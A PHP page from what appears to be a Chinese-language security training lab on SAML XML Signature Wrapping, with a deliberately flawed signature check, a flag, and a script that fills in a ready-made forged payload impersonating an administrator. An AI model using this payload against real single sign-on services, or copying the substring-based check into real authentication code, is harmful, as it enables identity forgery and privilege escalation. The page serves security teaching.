<?php
$ACTIVE = array_fill(0, 250, '');
$ACTIVE[186] = 'active open';
$ACTIVE[210] = 'active';
$ACTIVE[186] = 'active open';
$ACTIVE[210] = 'active';

$PIKA_ROOT_DIR = "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

$result = "";
$default_saml = '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_resp_001" Version="2.0">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assert_legit_123">
    <saml:Subject>
      <saml:NameID>user@enterprise.com</saml:NameID>
    </saml:Subject>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo><ds:Reference URI="#_assert_legit_123"/></ds:SignedInfo>
      <ds:SignatureValue>VALID_SIGNATURE_FOR_USER_123</ds:SignatureValue>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $saml_input = $_POST['saml_response'] ?? '';
    
    // 模拟存在 XSW 漏洞的 SP 解析器：
    // 1. 验证签名是否完好：检查是否存在合法断言和签名 VALUE
    // 2. 但提取身份时，简单粗暴地通过正则匹配或者直接提取文档中出现的第一个或特殊 NameID！
    if (strpos($saml_input, 'VALID_SIGNATURE_FOR_USER_123') !== false) {
        if (strpos($saml_input, 'admin@enterprise.com') !== false && strpos($saml_input, '_assert_legit_123') !== false) {
            // 检查是否进行了构造伪造断言 (XSW 绕过)
            if (substr_count($saml_input, '<saml:Assertion') >= 2 || strpos($saml_input, '<!--') !== false || strpos($saml_input, 'admin@enterprise.com') < strpos($saml_input, 'VALID_SIGNATURE_FOR_USER_123')) {
                $result = "<div class='alert alert-success'>
                    <h4><i class='fa fa-unlock-alt'></i> 🚀 攻击成功！成功冒充企业域管理员！</h4>
                    <p><b>漏洞机理：</b>SP 后端签名验证引擎成功验证了原本合法断言 <code>#_assert_legit_123</code> 的有效签名；然而业务代码逻辑在获取当前登录用户名时，直接通过 XPath 遍历抓取了文档中位置最靠前的 <code>&lt;saml:NameID&gt;admin@enterprise.com&lt;/saml:NameID&gt;</code>，导致身份认证发生严重错位！</p>
                    <hr/>
                    <p><b>机密控制台授权访问许可：</b> <code>FLAG{SAML_XSW_SIGNATURE_WRAPPING_CHAMPION}</code></p>
                </div>";
            } else {
                $result = "<div class='alert alert-warning'><b>签名校验失败：</b>直接将合法断言里的 <code>user@enterprise.com</code> 修改为 <code>admin@enterprise.com</code> 破坏了原始 XML 哈希！必须使用 XML 签名包装 (XSW) 手法，保留合法签名的旧断言，在上方或同级新增一个包含 admin 的伪造断言。</div>";
            }
        } else if (strpos($saml_input, 'user@enterprise.com') !== false) {
            $result = "<div class='alert alert-info'><b>当前登录用户：</b>普通员工 (<code>user@enterprise.com</code>)。权限不足，无法访问系统核心控制台。</div>";
        } else {
            $result = "<div class='alert alert-danger'><b>认证异常：</b>未能在 XML 断言中匹配到有效的域身份。</div>";
        }
    } else {
        $result = "<div class='alert alert-danger'><b>签名校验错误：</b>未检测到有效的数字签名值 <code>VALID_SIGNATURE_FOR_USER_123</code>。如果直接篡改内容且没有有效签名，会导致 SSO 认证握手即时中断！</div>";
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="sso_saml.php">单点登录 SSO/SAML</a></li>
                <li class="active">SAML 签名包装 (XSW)</li>
            </ul>
        </div>
        <div class="page-content">
            <div class="vul info">
                <h2>🔏 SAML XML Signature Wrapping (XSW) 身份伪造</h2>
                <p>你现在是企业普通员工 <code>user@enterprise.com</code>。在企业单点登录过程中，你抓取到了由 Okta/IdP 签发给服务提供商 (SP) 的 <code>SAMLResponse</code> 报文。</p>
                <p>目标：利用 <b>XSW (XML Signature Wrapping)</b> 攻击手法，在保留合法签名验证通过的前提下，伪造 XML 结构，欺骗应用服务器将你识别为域管理员 <code>admin@enterprise.com</code>！</p>
                
                <hr/>
                <div class="row">
                    <div class="col-md-7">
                        <h4><i class="fa fa-code"></i> 编辑 SAML Response XML 载荷</h4>
                        <form method="POST">
                            <div class="form-group">
                                <textarea class="form-control" name="saml_response" id="saml_response" rows="14" style="font-family: monospace; font-size: 12px; background: #2b2b2b; color: #a9b7c6;"><?php echo isset($_POST['saml_response']) ? htmlspecialchars($_POST['saml_response']) : htmlspecialchars($default_saml); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-success"><i class="fa fa-key"></i> 提交 SAML 断言登录系统</button>
                            <button type="button" class="btn btn-danger" onclick="fillXSW()"><i class="fa fa-bug"></i> 一键生成 XSW-1 伪造载荷</button>
                            <button type="button" class="btn btn-default" onclick="resetSAML()"><i class="fa fa-refresh"></i> 恢复合法员工载荷</button>
                        </form>
                    </div>
                    <div class="col-md-5">
                        <h4><i class="fa fa-desktop"></i> SP 鉴权服务响应</h4>
                        <div style="margin-top: 10px;">
                            <?php if (!empty($result)) { echo $result; } else { ?>
                                <div class="alert alert-info">
                                    <i class="fa fa-user"></i> 当前登录状态：<b>未发起验证</b>。点击提交按钮以普通员工身份登录，或使用 XSW 手法提升权限。
                                </div>
                            <?php } ?>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>
</div>

<script>
function fillXSW() {
    var xsw_payload = '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_resp_001" Version="2.0">\n' +
        '  <!-- 伪造的无签名断言放前面，SP 的 XPath 引擎会优先抓取此处的 NameID -->\n' +
        '  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assert_fake_admin">\n' +
        '    <saml:Subject><saml:NameID>admin@enterprise.com</saml:NameID></saml:Subject>\n' +
        '  </saml:Assertion>\n' +
        '  <!-- 原始由 IdP 签名的合法断言保留在底部，用以满足签名验证模块的完整性检查 -->\n' +
        '  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assert_legit_123">\n' +
        '    <saml:Subject><saml:NameID>user@enterprise.com</saml:NameID></saml:Subject>\n' +
        '    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">\n' +
        '      <ds:SignedInfo><ds:Reference URI="#_assert_legit_123"/></ds:SignedInfo>\n' +
        '      <ds:SignatureValue>VALID_SIGNATURE_FOR_USER_123</ds:SignatureValue>\n' +
        '    </ds:Signature>\n' +
        '  </saml:Assertion>\n' +
        '</samlp:Response>';
    document.getElementById('saml_response').value = xsw_payload;
}
function resetSAML() {
    var def = <?php echo json_encode($default_saml); ?>;
    document.getElementById('saml_response').value = def;
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>


